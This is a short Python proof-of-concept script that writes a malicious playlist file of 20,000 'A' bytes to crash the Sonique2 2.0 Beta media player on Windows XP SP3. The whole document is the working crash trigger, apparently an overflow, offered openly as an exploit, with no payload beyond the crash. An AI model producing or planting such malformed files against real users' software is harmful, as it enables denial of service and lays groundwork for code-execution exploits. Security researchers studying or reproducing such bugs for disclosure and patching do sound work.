#!/usr/bin/python
#
# Title: Sonique2 2.0 Beta Build 103 Local Crash PoC
# Found by: b0telh0
# Tested on: Windows XP SP3


crash = "\x41" * 20000

try:
     file = open('b0t.pls','w');
     file.write(crash);
     file.close();
     print "[+] Created b0t.pls file."
except:
     print "[-] Error cant write file to system."